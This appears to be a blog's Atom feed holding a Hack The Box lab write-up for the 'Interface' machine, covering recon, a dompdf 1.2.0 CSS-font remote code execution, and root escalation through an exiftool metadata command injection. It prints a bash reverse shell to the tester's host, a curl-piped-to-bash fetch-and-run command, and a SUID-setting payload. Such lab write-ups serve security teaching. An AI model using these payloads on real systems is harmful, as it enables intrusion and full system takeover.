@@ -1,0 +1,442 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://dotmuny.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://dotmuny.github.io/" rel="alternate" type="text/html" /><updated>2025-06-27T23:12:11+02:00</updated><id>https://dotmuny.github.io/feed.xml</id><title type="html">dotMuny’s blog</title><subtitle>Ethical Hacking and IT researching</subtitle><author><name>dotMuny</name></author><entry><title type="html">[HTB] Interface</title><link href="https://dotmuny.github.io/2025/06/27/HTB-Interface.html" rel="alternate" type="text/html" title="[HTB] Interface" /><published>2025-06-27T14:00:00+02:00</published><updated>2025-06-27T14:00:00+02:00</updated><id>https://dotmuny.github.io/2025/06/27/HTB-Interface</id><content type="html" xml:base="https://dotmuny.github.io/2025/06/27/HTB-Interface.html"><![CDATA[<p><img src="/img/htb_img/interface_img/interface.png" alt="Web recon" /></p>
+
+<p>OS: Linux
+IP: 10.10.11.200
+Complete: Yes
+Level: Medium
+Status: Done</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>With the HTB VPN connected, we start enumerating the machine with <code class="language-plaintext highlighter-rouge">nmap</code> .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-T4</span> <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-vvv</span> <span class="nt">-oG</span> allports <span class="nv">$target</span>
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-27 16:52 CEST
+Initiating SYN Stealth Scan at 16:52
+Scanning 10.10.11.200 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.11.200
+Discovered open port 22/tcp on 10.10.11.200
+Completed SYN Stealth Scan at 16:53, 11.65s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.11.200
+Host is up, received user-set <span class="o">(</span>0.041s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2025-06-27 16:52:54 CEST <span class="k">for </span>11s
+Not shown: 65370 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 163 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.77 seconds
+           Raw packets sent: 68278 <span class="o">(</span>3.004MB<span class="o">)</span> | Rcvd: 65979 <span class="o">(</span>2.639MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Two services are available on the machine: <code class="language-plaintext highlighter-rouge">SSH</code> on port 22 and <code class="language-plaintext highlighter-rouge">HTTP</code> on port 80.</p>
+
+<p>Next, the services and versions of both ports are scanned:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p22</span>,80 <span class="nt">-sCV</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> targeted <span class="nv">$target</span>       
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-27 17:14 CEST
+Nmap scan report <span class="k">for </span>10.10.11.200
+Host is up <span class="o">(</span>0.042s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 72:89:a0:95:7e:ce:ae:a8:59:6b:2d:2d:bc:90:b5:5a <span class="o">(</span>RSA<span class="o">)</span>
+|   256 01:84:8c:66:d3:4e:c4:b1:61:1f:2d:4d:38:9c:42:c3 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 cc:62:90:55:60:a6:58:62:9e:6b:80:10:5c:79:9b:55 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site Maintenance
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.39 seconds
+</code></pre></div></div>
+
+<p>The results show that the web service is <code class="language-plaintext highlighter-rouge">nginx 1.14.0</code> and the codenames of both services indicate that we are dealing with an Ubuntu Linux system.</p>
+
+<h2 id="web-recon">Web Recon</h2>
+
+<p><img src="/img/htb_img/interface_img/01.png" alt="Web recon" /></p>
+
+<p>When accessing the website, we can see that it is under maintenance and there is not much more information available, so we will have to perform some kind of <code class="language-plaintext highlighter-rouge">fuzzing</code>.</p>
+
+<h3 id="directory-fuzzing">Directory fuzzing</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://<span class="nv">$target</span>/FUZZ <span class="nt">--hl</span><span class="o">=</span>11
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.200/FUZZ
+Total requests: 220545
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
+=====================================================================
+
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 36660
+Filtered Requests: 36660
+Requests/sec.: 0
+</span></code></pre></div></div>
+
+<p>Nothing found even with other wordlists.</p>
+
+<hr />
+
+<p>After not finding anything through directory, we proceed to check the browser’s developer console on the website and find that the <code class="language-plaintext highlighter-rouge">Content Security Policy</code> field reveals a new subdomain, which we will add to our hosts file.</p>
+
+<p><img src="/img/htb_img/interface_img/02.png" alt="New subdomain" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2"> interface.htb prd.m.rendering-api.interface.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.200 interface.htb prd.m.rendering-api.interface.htb
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="subdomain-prdmrendering-apiinterfacehtb">Subdomain: prd.m.rendering-api.interface.htb</h2>
+
+<p>When visiting the new subdomain, we are greeted with the message <code class="language-plaintext highlighter-rouge">File not found</code>, which may imply that there is some file or endpoint that works, so we proceed to run a new fuzzing.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-u</span> http://prd.m.rendering-api.interface.htb/FUZZ <span class="nt">--hh</span><span class="o">=</span>0
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://prd.m.rendering-api.interface.htb/FUZZ
+Total requests: 43007
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
+=====================================================================
+
+000000144:   404        0 L      3 W        50 Ch       "api"                                                                                                                                                                 
+000000400:   403        1 L      2 W        15 Ch       "."                                                                                                                                                                   
+000002050:   403        1 L      2 W        15 Ch       "vendor"  
+</span></code></pre></div></div>
+
+<p>Since we have found an <code class="language-plaintext highlighter-rouge">api</code> directory, we will also perform fuzzing within this directory, using both GET and POST requests.</p>
+
+<p>We get a hit on a POST request, payload <code class="language-plaintext highlighter-rouge">html2pdf</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-u</span> http://prd.m.rendering-api.interface.htb/api/FUZZ <span class="nt">--hh</span><span class="o">=</span>50 <span class="nt">-X</span> POST
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://prd.m.rendering-api.interface.htb/api/FUZZ
+Total requests: 43007
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                               
+=====================================================================
+
+000008522:   422        0 L      2 W        36 Ch       "html2pdf"  
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-X</span> POST http://prd.m.rendering-api.interface.htb/api/html2pdf                                                                                                                                   
+<span class="o">{</span><span class="s2">"status_text"</span>:<span class="s2">"missing parameters"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">html2pdf</code> means that html gets transformed to a pdf file, so we try to send html data into the request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-X</span> POST http://prd.m.rendering-api.interface.htb/api/html2pdf <span class="nt">-d</span> <span class="s1">'{"html":"&lt;h1&gt;g00dm0rn1ng&lt;/h1&gt;"}'</span> <span class="nt">-o</span> good.pdf           
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1167  100  1136  100    31  13975    381 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 14407
+</code></pre></div></div>
+
+<p><img src="/img/htb_img/interface_img/03.png" alt="Web recon" /></p>
+
+<p>After visual inspection, we extract the metadata from the file to confirm the tool used to create the <code class="language-plaintext highlighter-rouge">PDF</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool good.pdf                                                                      
+ExifTool Version Number         : 13.25
+File Name                       : good.pdf
+Directory                       : <span class="nb">.</span>
+File Size                       : 1136 bytes
+File Modification Date/Time     : 2025:06:27 17:40:41+02:00
+File Access Date/Time           : 2025:06:27 17:41:03+02:00
+File Inode Change Date/Time     : 2025:06:27 17:40:41+02:00
+File Permissions                : <span class="nt">-rw-rw-r--</span>
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 1
+Producer                        : dompdf 1.2.0 + CPDF
+Create Date                     : 2025:06:27 15:40:30+00:00
+Modify Date                     : 2025:06:27 15:40:30+00:00
+</code></pre></div></div>
+
+<p>So, the pdf was created with a tool named <code class="language-plaintext highlighter-rouge">dompdf</code> version 1.2.0.</p>
+
+<p>Searching for this tool online, we can find some information about it:</p>
+
+<aside>
+ℹ️
+
+*dompdf is a library written in PHP that is used to generate PDF files from HTML and CSS code. It is widely used because it allows you to take a webpage or an HTML template and convert it into a PDF document quite easily.*
+
+</aside>
+
+<p>After getting this information, we try to find some vulnerabilities, exploits or PoC so we can operate with this tool.</p>
+
+<p>We find the following Github Repository:</p>
+
+<p><a href="https://github.com/positive-security/dompdf-rce">https://github.com/positive-security/dompdf-rce</a></p>
+
+<hr />
+
+<h1 id="foothold">Foothold</h1>
+
+<p>Dompdf 1.2.0 contains a critical <code class="language-plaintext highlighter-rouge">Remote Code Execution (RCE)</code> vulnerability that allows attackers to execute arbitrary PHP code through carefully crafted CSS injection. This vulnerability represents a significant security flaw in how Dompdf processes CSS styles during PDF generation.</p>
+
+<p>When Dompdf processes the malicious CSS, the embedded PHP code gets executed on the server, allowing attackers to perform various malicious activities such as file system access, command execution, or data exfiltration.</p>
+
+<hr />
+
+<p>We clone the github repository of this exploit that we found previously:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/positive-security/dompdf-rce.git                                         
+Cloning into <span class="s1">'dompdf-rce'</span>...
+remote: Enumerating objects: 343, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>17/17<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>16/16<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 343 <span class="o">(</span>delta 3<span class="o">)</span>, reused 13 <span class="o">(</span>delta 1<span class="o">)</span>, pack-reused 326 <span class="o">(</span>from 1<span class="o">)</span>
+Receiving objects: 100% <span class="o">(</span>343/343<span class="o">)</span>, 3.99 MiB | 9.89 MiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>64/64<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+
+❯ <span class="nb">cd </span>dompdf-rce
+</code></pre></div></div>
+
+<p>We will modify the CSS to our needs:</p>
+
+<p><img src="/img/htb_img/interface_img/04.png" alt="Web recon" /></p>
+
+<p>We also modify the php file to allow us to execute commands.</p>
+
+<p><img src="/img/htb_img/interface_img/05.png" alt="Web recon" /></p>
+
+<p>After that, we execute two servers, one at port 9000 and the other at 9001.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 9000
+❯ python3 <span class="nt">-m</span> http.server 9001
+</code></pre></div></div>
+
+<p>And we run our exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl http://prd.m.rendering-api.interface.htb/api/html2pdf <span class="nt">-d</span> <span class="s1">'{"html":"&lt;link rel=stylesheet href=\"http://10.10.14.7:9001/exploit.css\"&gt;"}'</span>
+</code></pre></div></div>
+
+<p>After that we check for our md5sum, because it’s used to create the php file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"http://10.10.14.7:9001/exploit_font.php"</span> | <span class="nb">md5sum         
+</span>05eee38048064022101b29bc7ca64806  -
+</code></pre></div></div>
+
+<p>So our md5sum is <code class="language-plaintext highlighter-rouge">05eee38048064022101b29bc7ca64806</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_05eee38048064022101b29bc7ca64806.php<span class="se">\?</span>cmd<span class="se">\=</span><span class="nb">id</span> <span class="nt">--output</span> -
+
+&lt;...&gt;
+
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Sooo, we have a foothold to execure a reverse shell to our machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>shell.sh       
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: shell.sh
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ <span class="c">#!/bin/bash</span>
+   2   │ 
+   3   │ bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp;/dev/tcp/10.10.14.7/4444 0&gt;&amp;1
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<p>So we will execute a curl to retrieve this information through RCE and the pipe a Bash to it to execute it.</p>
+
+<p>First we start a listener locally:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lvnp</span> 4444                             
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s2">"http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_05eee38048064022101b29bc7ca64806.php?cmd=curl+10.10.14.7:9001/shell.sh|bash"</span> <span class="nt">--output</span> -
+</code></pre></div></div>
+
+<p>And in our listener we get a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lvnp</span> 4444                             
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.14.7] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.200] 47828
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1369<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="err">$</span>
+</code></pre></div></div>
+
+<h3 id="optional-shell-stabilization">(Optional) Shell stabilization</h3>
+
+<p>We can stabilize our shell with 3 simple steps:</p>
+
+<ol>
+  <li>Bash process creation</li>
+  <li>STTY stab</li>
+  <li>Xterm resetting</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
+&lt;CTRL+Z&gt;
+
+❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>          
+<span class="o">[</span>1]  + 44802 continued  nc <span class="nt">-lvnp</span> 4444
+
+www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="nv">$ </span>reset xterm
+</code></pre></div></div>
+
+<p>We should also configure the rows and columns of our terminal emulator with <code class="language-plaintext highlighter-rouge">stty</code></p>
+
+<p>Locally we check our rows and columns:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">stty </span>size        
+53 231
+</code></pre></div></div>
+
+<p>In our reverse shell we configure exactly those rows and columns:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="nv">$ </span><span class="nb">stty </span>rows 53 columns 231
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="user-flag">USER FLAG</h2>
+
+<p>As <code class="language-plaintext highlighter-rouge">www-data</code>, we can read the user flag in the home of <code class="language-plaintext highlighter-rouge">dev</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="nv">$ </span><span class="nb">ls</span> /home
+dev
+www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="nv">$ </span><span class="nb">ls</span> /home/dev
+user.txt
+www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="nv">$ </span><span class="nb">cat</span> /home/dev/user.txt 
+&lt;<span class="k">**</span>REDACTED<span class="k">**</span><span class="o">&gt;</span>
+www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h1 id="lateral-movement">Lateral Movement</h1>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>After looking for credentials in files, we opt to upload an instance of <code class="language-plaintext highlighter-rouge">pspy</code>, a tool created to spy every command or process that executes code in memory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@interface:/tmp<span class="nv">$ </span>wget 10.10.14.7:9001/pspy
+<span class="nt">--2025-06-27</span> 16:21:44--  http://10.10.14.7:9001/pspy
+Connecting to 10.10.14.7:9001... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 <span class="o">(</span>3.0M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: <span class="s1">'pspy'</span>
+
+pspy                                                      100%[<span class="o">====================================================================================================================================&gt;]</span>   2.96M  8.21MB/s    <span class="k">in </span>0.4s    
+
+2025-06-27 16:21:45 <span class="o">(</span>8.21 MB/s<span class="o">)</span> - <span class="s1">'pspy'</span> saved <span class="o">[</span>3104768/3104768]
+
+www-data@interface:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x pspy
+www-data@interface:/tmp<span class="nv">$ </span>./pspy
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> | file-system-events<span class="o">=</span><span class="nb">false</span> <span class="o">||</span>| Scanning <span class="k">for </span>processes every 100ms and on inotify events <span class="o">||</span>| Watching directories: <span class="o">[</span>/usr /tmp /etc /home /var /opt] <span class="o">(</span>recursive<span class="o">)</span> | <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>
+</code></pre></div></div>
+
+<p>And we find the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>3070   | /bin/bash /usr/local/sbin/cleancache.sh
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">## /usr/local/sbin/cleancache.sh</span>
+<span class="c">#! /bin/bash</span>
+<span class="nv">cache_directory</span><span class="o">=</span><span class="s2">"/tmp"</span>
+<span class="k">for </span>cfile <span class="k">in</span> <span class="s2">"</span><span class="nv">$cache_directory</span><span class="s2">"</span>/<span class="k">*</span><span class="p">;</span> <span class="k">do
+
+    if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$cfile</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+
+        </span><span class="nv">meta_producer</span><span class="o">=</span><span class="si">$(</span>/usr/bin/exiftool <span class="nt">-s</span> <span class="nt">-s</span> <span class="nt">-s</span> <span class="nt">-Producer</span> <span class="s2">"</span><span class="nv">$cfile</span><span class="s2">"</span> 2&gt;/dev/null | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f1</span><span class="si">)</span>
+
+        <span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$meta_producer</span><span class="s2">"</span> <span class="nt">-eq</span> <span class="s2">"dompdf"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+            </span><span class="nb">echo</span> <span class="s2">"Removing </span><span class="nv">$cfile</span><span class="s2">"</span>
+            <span class="nb">rm</span> <span class="s2">"</span><span class="nv">$cfile</span><span class="s2">"</span>
+        <span class="k">fi
+
+    fi
+
+done</span>
+</code></pre></div></div>
+
+<p>This code scans the <code class="language-plaintext highlighter-rouge">/tmp</code> folder and extracts the metadata from all files, and then it deletes them.</p>
+
+<p>It extracts specifically the <code class="language-plaintext highlighter-rouge">Producer</code> metadata, so we can try to put something in there.</p>
+
+<p>The code is vulnerable to quoted expression injection</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$cfile</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</code></pre></div></div>
+
+<p>So we create a file that modifies the SUID bit to the Bash binary:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@interface:/tmp<span class="nv">$ </span><span class="nb">mkdir </span>nothere
+
+www-data@interface:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'#!/bin/bash\nchmod u+s /bin/bash'</span> <span class="o">&gt;</span> nothere/owned
+
+www-data@interface:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x nothere/owned
+
+www-data@interface:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span> /bin/bash
+	<span class="nt">-rwxr-xr-x</span> 1 root root 1.1M Apr 18  2022 /bin/bash
+</code></pre></div></div>
+
+<p>After that, we create a new file and link the <code class="language-plaintext highlighter-rouge">Producer</code> metadata to this file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@interface:/tmp<span class="nv">$ </span><span class="nb">touch </span>pwn
+
+www-data@interface:/tmp<span class="nv">$ </span>exiftool <span class="nt">-Producer</span><span class="o">=</span><span class="s1">'w[$(/tmp/nothere/owned)]'</span> pwn
+	1 image files updated
+</code></pre></div></div>
+
+<p>After a couple of seconds, we see that the file has been deleted, meaning that our payload has been executed.</p>
+
+<p>We can check the <code class="language-plaintext highlighter-rouge">bash</code> binary and upgrade to Root Shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@interface:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span> /bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1.1M Apr 18  2022 /bin/bash
+
+www-data@interface:/tmp<span class="nv">$ </span>bash <span class="nt">-p</span>
+
+bash-4.4# <span class="nb">cat</span> /root/root.txt
+&lt;<span class="k">**</span>REDACTED<span class="k">**</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Pwned!</p>]]></content><author><name>dotMuny</name></author><category term="htb" /><summary type="html"><![CDATA[[Machine] - Medium difficulty]]></summary></entry><entry><title type="html">First blog entry</title><link href="https://dotmuny.github.io/2025/06/27/First-Entry.html" rel="alternate" type="text/html" title="First blog entry" /><published>2025-06-27T12:00:00+02:00</published><updated>2025-06-27T12:00:00+02:00</updated><id>https://dotmuny.github.io/2025/06/27/First-Entry</id><content type="html" xml:base="https://dotmuny.github.io/2025/06/27/First-Entry.html"><![CDATA[<p>Markdown</p>
+
+<h2 id="hehe">hehe</h2>
+
+<p>…etc…</p>]]></content><author><name>dotMuny</name></author><category term="posts" /><summary type="html"><![CDATA[Markdown]]></summary></entry></feed>
